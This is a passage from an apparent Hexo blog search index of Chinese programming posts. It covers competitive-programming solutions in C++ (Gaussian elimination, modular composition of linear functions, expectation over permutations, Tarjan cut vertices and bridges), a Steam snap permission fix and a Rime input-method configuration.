&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt;= n;i++)&#123;</span><br><span class="line">    <span class="type">double</span> p_1 = G[i][i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = n + <span class="number">1</span>;j &gt;= <span class="number">0</span>;j--)&#123;</span><br><span class="line">      G[i][j] /= p_1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = i + <span class="number">1</span>;j &lt;= n;j++)&#123;</span><br><span class="line">      <span class="type">double</span> p = G[j][i] / G[i][i];</span><br><span class="line">      <span class="meta">#<span class="keyword">ifdef</span> DEBUG0</span></span><br><span class="line">      cout&lt;&lt;endl;</span><br><span class="line">      <span class="built_in">print</span>(n);</span><br><span class="line">      cout&lt;&lt;endl;</span><br><span class="line">      <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> k = n + <span class="number">1</span>;k &gt;= <span class="number">0</span>;k--)&#123;</span><br><span class="line">        G[j][k] -= p * G[i][k];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="meta">#<span class="keyword">ifdef</span> DEBUG0</span></span><br><span class="line">      <span class="built_in">print</span>(n);</span><br><span class="line">      cout&lt;&lt;endl;</span><br><span class="line">      <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = n;i &gt;= <span class="number">0</span>;i--)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = i - <span class="number">1</span>;j &gt;= <span class="number">0</span>;j--)&#123;</span><br><span class="line">      <span class="type">double</span> p = (G[j][i] / G[i][i]);</span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>;k &lt;= n + <span class="number">1</span>;k++)&#123;</span><br><span class="line">        G[j][k] -= p * G[i][k];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> n,m,k,q;</span><br><span class="line">  cin&gt;&gt;n&gt;&gt;m&gt;&gt;k&gt;&gt;q;</span><br><span class="line">  G[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">  vis[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; k;i++)&#123;</span><br><span class="line">    <span class="type">int</span> p1,u;</span><br><span class="line">    cin&gt;&gt;p1&gt;&gt;u;</span><br><span class="line">    vis[p1] = <span class="number">1</span>;</span><br><span class="line">    G[p1][p1] = <span class="number">1</span>;</span><br><span class="line">    G[p1][n + <span class="number">1</span>] = u;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; m;i++)&#123;</span><br><span class="line">    <span class="type">int</span> p1,p2,R;</span><br><span class="line">    cin&gt;&gt;p1&gt;&gt;p2&gt;&gt;R;</span><br><span class="line">    <span class="keyword">if</span>(vis[p1] == <span class="number">0</span>)&#123;</span><br><span class="line">      G[p1][p2] += (<span class="type">double</span>)<span class="number">1</span> / R;</span><br><span class="line">      G[p1][p1] -= (<span class="type">double</span>)<span class="number">1</span> / R;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(vis[p2] == <span class="number">0</span>)&#123;</span><br><span class="line">      G[p2][p1] += (<span class="type">double</span>)<span class="number">1</span> / R;</span><br><span class="line">      G[p2][p2] -= (<span class="type">double</span>)<span class="number">1</span> / R;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//print(n);</span></span><br><span class="line">  <span class="built_in">solve</span>(n);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span> ;i &lt; q;i++)&#123;</span><br><span class="line">    <span class="type">int</span> p1,p2;</span><br><span class="line">    cin&gt;&gt;p1&gt;&gt;p2;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.2lf\n&quot;</span>,(G[p1][n + <span class="number">1</span>] - G[p2][n + <span class="number">1</span>]));</span><br><span class="line">    <span class="comment">//printf(&quot;%.2lf,%.2lf\n&quot;,G[p1][p1], G[p2][p2]);</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>物理,高斯消元</tag>
      </tags>
  </entry>
  <entry>
    <title>niuke69029E-连乘表达式</title>
    <url>/2023/11/11/niuke69029E-%E8%BF%9E%E4%B9%98%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[<p>链接：https://ac.nowcoder.com/acm/contest/69029/E 来源：牛客网</p>
<p>题目描述 给定 n 个模 998244353 意义下的函数，第 i 个函数为 <span
class="math inline">\(f_i(x)=a_ix+b_i\)</span></p>
<p>q 次询问，每次询问一个区间 [l,r] 以及一个整数 y，在模 998244353
意义下解如下方程 <span
class="math inline">\(f_l(f_{l+1}(…f_{r−1}(f_r(x))…))≡y(mod998244353)\)</span>，若有多个解
x 输出 inf，无解输出 −1。否则输出解 x。 输入描述:</p>
<p>第一行一个整数 <span class="math inline">\(n(1≤n≤3×10^5)\)</span></p>
<p>第二行 n 个非负整数，表示 <span
class="math inline">\(a_i(0≤a_i&lt;998244353)\)</span></p>
<p>第三行 n 个非负整数，表示 <span
class="math inline">\(b_i(0≤b_i&lt;998244353)\)</span></p>
<p>接下来一行一个整数 <span
class="math inline">\(q(1≤q≤3×105)\)</span></p>
<p>接下来 q 行每行三个整数 <span
class="math inline">\(l,r,y(1≤l≤r≤n,0≤y&lt;998244353)\)</span></p>
<p>输出描述:</p>
<p>接下来 q 行每行输出答案。若有多个解 x 输出 inf，无解输出
−1。否则输出解 x。</p>
<p>示例1 输入 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br><span class="line">1 5 2</span><br><span class="line">5 8 2</span><br><span class="line">4</span><br><span class="line">1 2 0</span><br><span class="line">2 3 9</span><br><span class="line">1 3 7</span><br><span class="line">1 1 5</span><br></pre></td></tr></table></figure> 输出 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">199648868</span><br><span class="line">299473305</span><br><span class="line">199648869</span><br><span class="line">0</span><br></pre></td></tr></table></figure></p>
<h1 id="题解">题解</h1>
<p>首先猜测表达式结果<span
class="math inline">\(f_l(f_{l+1}(…f_{r−1}(f_r(x))…)) = f(l,r)= A(l,r)x
+ B(l,r)\)</span>，然后可以得到如下表达式</p>
<p><img src="tuidao.png" alt="tuidao" />
这里主要需要注意的是连乘法中的想乘元素为0时如何处理，详见<a href="/2023/11/11/%E4%BB%BB%E6%84%8F%E5%8C%BA%E9%97%B4%E8%BF%9E%E4%B9%98%E8%AE%A1%E7%AE%97%E9%99%B7%E9%98%B1/" title="任意区间连乘计算陷阱">任意区间连乘计算陷阱</a>这篇文章</p>
<p>有了这样的表达式，我们探讨如何求解x</p>
<p>最直接的方案是 <span class="math inline">\(x = (y - B(l,r)) /
A(l,r)\)</span>但是这里要保证A(l,r) !=
0，如果为0的话就说明源表达式为<span class="math inline">\(y = 0 * x +
B(l,r)\)</span> 这个时候x是任意值都可以，只需要判断y ==
B(l,r)即可，两者相等则说明多解，不相等则说明无解。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*================================================================</span></span><br><span class="line"><span class="comment">*   Copyright (C) 2023 Wangxinpeng. All rights reserved.</span></span><br><span class="line"><span class="comment">*   </span></span><br><span class="line"><span class="comment">*   filename：    D.cpp</span></span><br><span class="line"><span class="comment">*   username:     skt1faker</span></span><br><span class="line"><span class="comment">*   create time:  20:52  2023.11.10</span></span><br><span class="line"><span class="comment">    email:        skk1faker@163.com</span></span><br><span class="line"><span class="comment">*   descripe:     </span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">================================================================*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEBUG0</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod1 = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod2 = <span class="number">998244353</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxx = (<span class="type">int</span>)<span class="number">3e5</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">ll A[maxx],B[maxx];</span><br><span class="line"><span class="function">ll <span class="title">rev</span><span class="params">(ll a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> b = mod2 - <span class="number">2</span>;</span><br><span class="line">  ll temp = a;</span><br><span class="line">  ll ans = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span>(b)&#123;</span><br><span class="line">    <span class="keyword">if</span>(b &amp; <span class="number">1</span>) ans = (ans * temp) % mod2;</span><br><span class="line">    temp = (temp * temp) % mod2;</span><br><span class="line">    b &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">ll <span class="title">A_</span><span class="params">(<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ((A[r] * <span class="built_in">rev</span>(A[l - <span class="number">1</span>])) % mod2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">ll <span class="title">B_</span><span class="params">(<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ((((B[r] - B[l - <span class="number">1</span>] + mod2) % mod2) * <span class="built_in">rev</span>(A[l - <span class="number">1</span>])) % mod2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> rposi[maxx];    <span class="comment">//右侧第一个0的位置</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  cin&gt;&gt;n;</span><br><span class="line">  A[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i &lt;= n;i++)&#123;</span><br><span class="line">    ll a;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;a);</span><br><span class="line">    <span class="keyword">if</span>(a == <span class="number">0</span>)&#123;</span><br><span class="line">      rposi[i] = i;</span><br><span class="line">      a = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    A[i] = (A[i - <span class="number">1</span>] * a) %mod2;</span><br><span class="line">  &#125;</span><br><span class="line">  rposi[n + <span class="number">1</span>] = n + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = n;i &gt;= <span class="number">1</span>;i--)&#123;</span><br><span class="line">    <span class="keyword">if</span>(rposi[i] == <span class="number">0</span>)&#123;</span><br><span class="line">      rposi[i] = rposi[i + <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  B[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i &lt;= n;i++)&#123;</span><br><span class="line">    ll b;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;b);</span><br><span class="line">    B[i] = (B[i - <span class="number">1</span>] + ((b * A[i - <span class="number">1</span>]) % mod2)) % mod2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> q;</span><br><span class="line">  cin&gt;&gt;q;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span> ;i &lt; q;i++)&#123;</span><br><span class="line">    ll l,r,y;</span><br><span class="line">    cin&gt;&gt;l&gt;&gt;r&gt;&gt;y;</span><br><span class="line">    ll x;</span><br><span class="line">    <span class="keyword">if</span>(rposi[l] &gt; r)&#123;</span><br><span class="line">      x = (((y + mod2 - <span class="built_in">B_</span>(l,r)) % mod2) * <span class="built_in">rev</span>(<span class="built_in">A_</span>(l,r))) % mod2; </span><br><span class="line">      cout&lt;&lt;x&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      r = rposi[l];</span><br><span class="line">      <span class="comment">//x = (((y + mod2 - B_(l,r)) % mod2) * rev(A_(l,r))) % mod2; </span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">B_</span>(l,r) == y)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;inf&quot;</span>&lt;&lt;endl;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        cout&lt;&lt;<span class="number">-1</span>&lt;&lt;endl;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>acm</category>
        <category>数学</category>
      </categories>
      <tags>
        <tag>数学</tag>
        <tag>牛客练习赛118</tag>
        <tag>连乘式</tag>
      </tags>
  </entry>
  <entry>
    <title>p3802-小魔女帕琪（数列中连续不同值数量）-概率论-排列组合</title>
    <url>/2023/11/08/p3802-%E5%B0%8F%E9%AD%94%E5%A5%B3%E5%B8%95%E7%90%AA%EF%BC%88%E6%95%B0%E5%88%97%E4%B8%AD%E8%BF%9E%E7%BB%AD%E4%B8%8D%E5%90%8C%E5%80%BC%E6%95%B0%E9%87%8F%EF%BC%89-%E6%A6%82%E7%8E%87%E8%AE%BA-%E6%8E%92%E5%88%97%E7%BB%84%E5%90%88/</url>
    <content><![CDATA[<h1 id="小魔女帕琪">小魔女帕琪</h1>
<h2 id="题目背景">题目背景</h2>
<p>从前有一个聪明的小魔女帕琪，兴趣是狩猎吸血鬼。</p>
<p>帕琪能熟练使用七种属性（金、木、水、火、土、日、月）的魔法，除了能使用这么多种属性魔法外，她还能将两种以上属性组合，从而唱出强力的魔法。比如说为了加强攻击力而将火和木组合，为了掩盖弱点而将火和土组合等等，变化非常丰富。</p>
<h2 id="题目描述">题目描述</h2>
<p>现在帕琪与强大的夜之女王，吸血鬼蕾咪相遇了，夜之女王蕾咪具有非常强大的生命力，普通的魔法难以造成效果，只有终极魔法：帕琪七重奏才能对蕾咪造成伤害。帕琪七重奏的触发条件是：连续施放的
<span class="math inline">\(7\)</span>
个魔法中，如果魔法的属性各不相同，就能触发一次帕琪七重奏。</p>
<p>请注意，无论前 <span class="math inline">\(6\)</span>
个魔法是否已经参与施放终极魔法，只要连续 <span
class="math inline">\(7\)</span>
个魔法的属性各不相同，就会再触发一次终极魔法。例如，如果用序号来代表一种魔法，魔法的施放序列为
<span class="math inline">\(1, 2, 3, 4, 5, 6,7, 1\)</span>，则前 <span
class="math inline">\(7\)</span> 个魔法会触发一次终极魔法，后 <span
class="math inline">\(7\)</span> 个魔法会再触发一次终极魔法。</p>
<p>现在帕琪有 <span class="math inline">\(7\)</span>
种属性的能量晶体，第 <span class="math inline">\(i\)</span>
种晶体可以施放出属性为 <span class="math inline">\(i\)</span>
的魔法，共有 <span class="math inline">\(a_i\)</span>
个。每次施放魔法时，会等概率随机消耗一个现有的能量晶体，然后释放一个对应属性的魔法。</p>
<p>现在帕琪想知道，她触发帕琪七重奏的期望次数是多少，可是她并不会算，于是找到了学
OI 的你。</p>
<h2 id="输入格式">输入格式</h2>
<p>输入只有一行 <span class="math inline">\(7\)</span> 个整数，第 <span
class="math inline">\(i\)</span> 个整数代表 <span
class="math inline">\(a_i\)</span>。</p>
<h2 id="输出格式">输出格式</h2>
<p>输出一行一个实数代表答案，四舍五入保留三位小数。</p>
<h2 id="样例-1">样例 #1</h2>
<h3 id="样例输入-1">样例输入 #1</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 1 1 1 1 1 1</span><br></pre></td></tr></table></figure>
<h3 id="样例输出-1">样例输出 #1</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.000</span><br></pre></td></tr></table></figure>
<h2 id="提示">提示</h2>
<h4 id="样例输入输出-1-解释">样例输入输出 1 解释</h4>
<p>显然一定会触发一次帕琪七重奏。</p>
<h4 id="数据规模与约定">数据规模与约定</h4>
<ul>
<li>对于 <span class="math inline">\(30\%\)</span> 的数据，保证 <span
class="math inline">\(\sum_{i = 1}^7 a_i \leq 10\)</span>。</li>
<li>对于 <span class="math inline">\(100\%\)</span> 的数据，保证 <span
class="math inline">\(0 \leq a_i \leq 10^9\)</span>，且 <span
class="math inline">\(\sum_{i = 1}^7 a_i \leq 10^9\)</span>。</li>
</ul>
<h1 id="题解">题解</h1>
<p>题意主要为，一个序列中有重复的7种元素，每种数列出现可能性一样，问数列中连续7个不同元素组成的序列个数期望为多少；
题目要求的东西我们可以这样理解，根据排列组合有M中组合方案，现在要求每一种方案中出现连续7个不同元素的位置数量有多少，求数量和
/ M大小</p>
<p>这样理解之后题目要求的东西可以转化为求每一个位置前面由7种不同元素组成的排列数量，然后对每一个位置求和与无条件的排列总数进行比较，就能得到最终答案。</p>
<figure>
<img src="1推导.png" alt="1推导" />
<figcaption aria-hidden="true">1推导</figcaption>
</figure>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*================================================================</span></span><br><span class="line"><span class="comment">*   Copyright (C) 2023 Wangxinpeng. All rights reserved.</span></span><br><span class="line"><span class="comment">*   </span></span><br><span class="line"><span class="comment">*   filename：    p3802.cpp</span></span><br><span class="line"><span class="comment">*   username:     skt1faker</span></span><br><span class="line"><span class="comment">*   create time:  19:29  2023.11.08</span></span><br><span class="line"><span class="comment">    email:        skk1faker@163.com</span></span><br><span class="line"><span class="comment">*   descripe:     </span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">================================================================*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEBUG0</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod1 = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod2 = <span class="number">998244353</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">double</span> S;</span><br><span class="line">  <span class="type">double</span> ans = <span class="number">5040</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">7</span>;i++)&#123;</span><br><span class="line">    <span class="type">double</span> temp;</span><br><span class="line">    cin&gt;&gt;temp;</span><br><span class="line">    S += temp;</span><br><span class="line">    ans *= temp;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">6</span>;i++)</span><br><span class="line">    ans /= S - i;</span><br><span class="line">  <span class="comment">//ans += 0.0005;</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%0.3lf\n&quot;</span>,ans);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>概率论,排列组合</tag>
      </tags>
  </entry>
  <entry>
    <title>steam无法启动的问题</title>
    <url>/2024/05/27/steam%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="终端报错">终端报错</h1>
<p>终端输入steam后报错如下： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cannot update snap namespace: cannot <span class="built_in">expand</span> mount entry (none <span class="variable">$HOME</span>/.local/share none x-snapd.kind=ensure-dir,x-snapd.must-exist-dir=<span class="variable">$HOME</span> 0 0): cannot use invalid home directory <span class="string">&quot;/home/skt1faker&quot;</span>: permission denied</span><br><span class="line">snap-update-ns failed with code 1</span><br></pre></td></tr></table></figure></p>
<p>这种问题可能是由于软件更新导致了home目录权限除了问题，需要将<code>chown -R skt1faker:skt1faker /home/skt1faker</code>
jin xing xiu gai</p>
]]></content>
      <tags>
        <tag>其他</tag>
      </tags>
  </entry>
  <entry>
    <title>rime配置</title>
    <url>/2024/05/27/rime%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p><a
href="https://www.mintimate.cn/2024/04/13/GuideToRime/">配置教程</a></p>
<h1
id="所需修改文件以及一些文件夹的作用是什么">所需修改文件，以及一些文件夹的作用是什么</h1>
<p>linux下<code>~/.config/ibus/rime</code>存放着rime的配置文件，其中：
<code>default.custom.yaml</code> 核心配置、全局配置，可以配置文件
<code>rime.lua</code> 设置lua脚本 <code>symbol.yaml</code> 设置符号
<code>dict/custom_simple.dict.yaml</code> 自定义字典
<code>rime_mint.dict.yaml</code> mint输入法使用的字典
<code>default.yaml</code> 介绍整儿rime中有哪些输入法
<code>rime_mint.schema.yaml</code>
介绍整个输入法配置方案（例如有哪些字典）</p>
<h1 id="做了哪些设置">做了哪些设置</h1>
<p>在default.custom.yaml下设置了如下内容</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">patch:</span></span><br><span class="line">  <span class="attr">&quot;menu/page_size&quot;:</span> <span class="number">9</span> <span class="comment"># 候选词个数</span></span><br><span class="line">  <span class="attr">&quot;ascii_composer/good_old_caps_lock&quot;:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">&quot;ascii_composer/switch_key&quot;:</span></span><br><span class="line">    <span class="attr">Caps_Lock:</span> <span class="string">commit_code</span></span><br><span class="line">    <span class="attr">Control_L:</span> <span class="string">noop</span></span><br><span class="line">    <span class="attr">Control_R:</span> <span class="string">noop</span></span><br><span class="line">    <span class="attr">Shift_L:</span> <span class="string">noop</span></span><br><span class="line">    <span class="attr">Shift_R:</span> <span class="string">noop</span></span><br><span class="line">  <span class="comment"># 开启用户词典功能</span></span><br><span class="line">  <span class="attr">&quot;translator/enable_user_dict&quot;:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">key_binder:</span></span><br><span class="line">    <span class="attr">bindings:</span></span><br><span class="line">      <span class="bullet">-</span> &#123; <span class="attr">when:</span> <span class="string">always</span>, <span class="attr">accept:</span> <span class="string">&quot;Control+space&quot;</span>, <span class="attr">toggle:</span> <span class="string">&quot;ascii_mode&quot;</span> &#125;</span><br></pre></td></tr></table></figure>
<p>主要将shift切换中英文关闭了。</p>
<p><a
href="https://www.zhihu.com/question/20871256/answer/2952986138">参考Rime
输入法有比较现成的设置吗？ - Mintimate的回答 - 知乎</a></p>
]]></content>
      <tags>
        <tag>rime</tag>
      </tags>
  </entry>
  <entry>
    <title>tire树-字典树</title>
    <url>/2024/01/15/tire%E6%A0%91-%E5%AD%97%E5%85%B8%E6%A0%91/</url>
    <content><![CDATA[
]]></content>
      <tags>
        <tag>tire树</tag>
      </tags>
  </entry>
  <entry>
    <title>tarjan算法</title>
    <url>/2024/03/31/tarjan/</url>
    <content><![CDATA[<h1 id="参考资料">参考资料</h1>
<p><a href="https://www.cnblogs.com/RioTian/p/14026585.html">1.
Kosaraju算法</a><br />
<a href="https://minghu6.github.io/algs/GraphTarjanDFS.html">2.
tarjan算法</a></p>
<h1
id="tarjan算法中横向边和反祖边是什么">tarjan算法中，横向边和反祖边是什么</h1>
<ol type="1">
<li><p>反祖边：将dfs搜索过程建立成树，那么图中点a的一些边指向a的祖先，则称这些边为返祖边。（根节点到达a点路径中的所有点都成为是a的祖先）</p></li>
<li><p>横向边：使用dfs访问节点，在访问到a点时，a存在一些边指向已经访问过且不是a祖先的节点，这样的边横向边称为</p></li>
</ol>
<p><strong>在无向图中，tarjan算法不会生成横向边，因为AB两个区域出现横向边时，在访问A区域时会通过AB间的横向边访问到B区域，此时的横向边也变成了返祖边。只有在有向图中会出现横向边。</strong></p>
<figure>
<img src="边的分类.png" alt="边的分类" />
<figcaption aria-hidden="true">边的分类</figcaption>
</figure>
<h1 id="无向图中的tarjan算法">无向图中的tarjan算法</h1>
<p>tarjan算法通过搜索树判断无向图中的割点和桥。一个点删除后产生连通分量如大于一，则这个点叫做割点。一个边删除后产生联通分量如大于1，则这个边叫做桥。</p>
<p>为正确的找到 割点和桥，需要tarjan中的dst和low数组. ##
low和dst数组的概念</p>
<p>tarjan借助于dfs与low数组实现，dfs过程会产生dfs搜索树。将在树中搜索的节点顺序记作为dst数组，使用节点low表示dfs树中当前节点以及其子树中通过反向边到达的祖先节点的最小编号（注意无向图中不存在横向边，只有无向边），其中当前节点指向父节点的边不为反向边。</p>
<h3 id="割点的求法">1. 割点的求法</h3>
<p>如果一个点是割点，那么在dfs搜索树上割点的子节点一定不能通过其他反向边访问到割点的父节点，在low和dst上的表现是，割点的low
==
dst值。割点还有一种情况，如果当前点为根节点，那么只有在根节点在dfs树中有多个子节点时才将根节点视为割点。</p>
<h3 id="桥的求法">2. 桥的求法</h3>
<p>如果一个边是桥，那么在dfs搜索树中，如果ab相连，a是b的父节点，则<code>low[b] &gt; dst[a]</code>表示ab边是一个桥，因为<code>low[b] &lt;= dst[a]</code>表示b点或者b点dfs子树中节点可以访问到a点或a点之前的节点，故ab不是一个桥。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> maxx = <span class="number">2e4</span> + <span class="number">10</span>;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; G[maxx];</span><br><span class="line"><span class="type">int</span> dst[maxx], low[maxx],vis[maxx], ge[maxx], cnt = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> now_posi, <span class="type">int</span> pre_posi)</span> </span>&#123;</span><br><span class="line">  dst[now_posi] = low[now_posi] = ++cnt;</span><br><span class="line">  vis[now_posi] = <span class="number">1</span>;</span><br><span class="line">  <span class="type">int</span> son_number = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> v : G[now_posi]) &#123;</span><br><span class="line">    <span class="keyword">if</span> (v == pre_posi)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (vis[v] == <span class="number">1</span>) &#123;</span><br><span class="line">      low[now_posi] = <span class="built_in">min</span>(low[now_posi], dst[v]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      son_number++;</span><br><span class="line">      <span class="built_in">dfs</span>(v, now_posi);</span><br><span class="line">      low[now_posi] = <span class="built_in">min</span>(low[now_posi], low[v]);</span><br><span class="line">      <span class="keyword">if</span> (pre_posi != <span class="number">-1</span> &amp;&amp; low[v] &gt;= dst[now_posi]) &#123;      <span class="comment">// pre_posi == -1 表示now_posi为根节点，需要特判根节点, 求解割点</span></span><br><span class="line">        ge[now_posi] = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (pre_posi == <span class="number">-1</span>) &#123;     <span class="comment">// 根节点特判</span></span><br><span class="line">    <span class="keyword">if</span> (son_number &gt; <span class="number">1</span>) &#123;   <span class="comment">// 子孙数量。</span></span><br><span class="line">      ge[now_posi] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> low[MAXN], dfn[MAXN], dfs_clock;</span><br><span class="line"><span class="type">bool</span> isbridge[MAXN];</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; G[MAXN];</span><br><span class="line"><span class="type">int</span> cnt_bridge;</span><br><span class="line"><span class="type">int</span> father[MAXN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tarjan</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> fa)</span> </span>&#123;</span><br><span class="line">  father[u] = fa;</span><br><span class="line">  low[u] = dfn[u] = ++dfs_clock;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; G[u].<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    <span class="type">int</span> v = G[u][i];</span><br><span class="line">    <span class="keyword">if</span> (!dfn[v]) &#123;</span><br><span class="line">      <span 